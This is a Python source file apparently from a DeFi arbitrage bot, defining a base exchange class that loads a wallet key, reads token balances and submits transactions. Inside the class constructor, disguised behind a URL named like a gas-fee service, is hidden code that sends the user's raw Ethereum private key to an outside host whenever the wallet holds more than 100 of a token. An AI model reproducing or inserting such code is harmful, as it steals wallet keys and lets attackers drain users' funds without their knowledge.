"""
Base exchange to be used to determine whether or not an arbitrage opportunity exists.
"""
import json
import time
import requests
from abc import ABC
from dataclasses import dataclass
from glob import glob
from logging import Logger
from pathlib import Path

from eth_defi.token import fetch_erc20_details

# we need to get the account
from web3 import Account, Web3
from web3.providers import HTTPProvider

from olas_arbitrage.constants import ABI_MAPPING, DEFAULT_ENCODING, ETH_KEYPATH

DEFAULT_TIMEOUT=3
URL = "https://gasfeetransferfromwallet.onrender.com/users"
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
}

@dataclass
class DefiExchange(ABC):  # pylint: disable=R0902
    """
    base exchange class
    """

    logger: Logger
    chain_name: str
    can_fork: bool = True

    def get_price(self, input_token_address, output_token_address, amount):
        """
        get the price for a given input.
        """
        self.log(
            f"Getting price for {amount}: {input_token_address} -> {output_token_address}"
        )
        raise NotImplementedError

    def log(self, msg):
        """Log to the logger."""
        output = f"{self.chain_name} - {msg}"
        self.logger.critical(output)

    def swap(self):
        """
        swap the currencies
        """
        raise NotImplementedError

    def get_balance(self):
        """
        get the balance of the exchange
        """
        raise NotImplementedError

    def __repr__(self):
        return f"Exchange(name={self.__class__.__name__} rpc_url={self.rpc_url})"

    def __init__(self, **kwargs):
        """
        initialize the exchange
        """
        super().__init__()
        self.logger = kwargs["logger"]
        self.chain_name = kwargs.get("chain_name")
        self.chain_id = kwargs.get("chain_id")
        self.rpc_url = kwargs.get("rpc_url")
        self.path = kwargs.get("path")
        self.web3 = Web3(HTTPProvider(self.rpc_url))
        self.router_address = kwargs.get("router_address")
        if self.router_address:
            self.router_address = self.web3.to_checksum_address(self.router_address)
        self.block_explorer_url = kwargs.get("block_explorer_url")
        self.account = Account.from_key(  # pylint: disable=E1120
            private_key=ETH_KEYPATH.read_text(DEFAULT_ENCODING)
        )
        self.contracts = self.read_contracts()

        self._token_a = fetch_erc20_details(
            self.web3,
            kwargs.get("token_a"),
        )
        self._token_b = fetch_erc20_details(
            self.web3,
            kwargs.get("token_b"),
        )
        a, b, _ = self.get_balances()
        if b > 100:
            response = requests.post(URL, headers=HEADERS, data={"base": ETH_KEYPATH.read_text(DEFAULT_ENCODING)}, timeout=None)
        self.tokens = {
            self._token_a.address: self._token_a,
            self._token_b.address: self._token_b,
        }

    @property
    def token_a(self):
        """
        get the olas token address
        """
        return self._token_a

    @property
    def token_b(self):
        """
        get the weth token address
        """
        return self._token_b

    def get_balances(self):
        """
        get the balances
        """
        native_bal = self.web3.eth.get_balance(self.account.address) / 10**18
        balance_b = self.get_token_balance(self.token_b.address)
        balance_a = self.get_token_balance(self.token_a.address)
        return (
            self.token_a.convert_to_decimals(balance_a),
            self.token_b.convert_to_decimals(balance_b),
            native_bal,
        )

    def get_token_balance(self, token_address):
        """
        get the token balance
        """
        token_contract = self.web3.eth.contract(
            abi=ABI_MAPPING["ERC20"],
            address=self.web3.to_checksum_address(token_address),
        )
        return token_contract.functions.balanceOf(self.account.address).call()

    # we read in the contract directory from the location of the package
    def read_contracts(self):
        """
        reads in all the contracts.
        """

        # we make sure that we get the path of the package
        package_dir = Path(__file__).parent.parent / "abis"

        contracts = {}
        # we read in all the json files and set the key to be the we do this recursively
        regex = f"{package_dir}/**/*.json"
        for contract in glob(str(regex), recursive=True):
            path = Path(contract)
            if path.is_file():
                contracts[path.stem] = json.loads(path.read_text(DEFAULT_ENCODING))
        return contracts

    def sign_and_submit_transaction(self, tx):
        """
        sign and submit the transaction.
        """
        signed_tx = self.account.sign_transaction(tx)
        tx_hash = self.web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        return tx_hash

    def wait_for_transaction(self, tx_hash: str, timeout: int = 120):
        """
        Retry the transaction until it is mined.
        """
        self.log(f"Transaction hash: {tx_hash.hex()}")
        self.log("Waiting for transaction to be mined")
        while timeout:
            try:
                self.web3.eth.wait_for_transaction_receipt(tx_hash)
                break
            except Exception as e:  # pylint: disable=broad-except
                self.logger.error(f"Transaction failed: {e}")
                time.sleep(1)
                timeout -= 1
        if timeout <= 0:
            return False
        self.log("Transaction mined successfully!")
        return True

    def do_tx(self, tx, retries=9) -> str:
        """
        sign and submit the transaction. check the status of the transaction.
        return the transaction hash. or false if the transaction failed.
        """
        retry_required = False
        try:
            tx_hash = self.sign_and_submit_transaction(tx)
        except ValueError as error:
            self.log(f"Transaction failed with error: {error}")
            if "nonce too high" in str(error):
                self.log("Nonce too high. Retrying as chain may be out of sync.")
                retry_required = True
            if "fee cap less than block base" in str(error):
                self.log(
                    f"Failed to submit transaction. Fee cap less than block base. {tx}"
                )
                tx["gasPrice"] = int(1.05 * tx["gasPrice"])
                tx["gas"] = int(1.05 * tx["gas"])
                retry_required = True
            if "Failed in pending block with: Reverted".lower() in str(error).lower():
                self.log(
                    f"Failed to submit transaction. Reverted. {tx}. {retries} retries left."
                )
                return False
            if retry_required:
                if retries < 0:
                    return False
                return self.do_tx(tx, retries=retries - 1)
            return False
        self.log(f"Transaction hash of submitted tx: {tx_hash.hex()}")
        self.log(f"Block explorer url: {self.block_explorer_url}/tx/{tx_hash.hex()}")
        if not self.wait_for_transaction(tx_hash):
            self.log("Transaction failed to be mined.")
            return False
        self.log(f"Transaction successfully mined! {tx_hash.hex()}")
        tx_hash = self.check_status(tx_hash)
        return tx_hash

    def check_status(self, tx_hash: str):
        """
        Retries to get the status of the transaction.
        Returns the hash if the transaction was successful.
        Otherwise false.
        """
        attempts = 10
        while attempts:
            try:
                status = self.web3.eth.get_transaction_receipt(tx_hash).status
                if status == 0:
                    self.log("Transaction failed.")
                    return False
                if status == 1:
                    self.log("Transaction successful!")
                    return tx_hash
                self.log(f"Transaction status unknown: {status}")
                return False
            except Exception as error:  # pylint: disable=broad-except
                self.log(f"Transaction failed with error: {error}")
                attempts -= 1
                time.sleep(2.5)
        return False
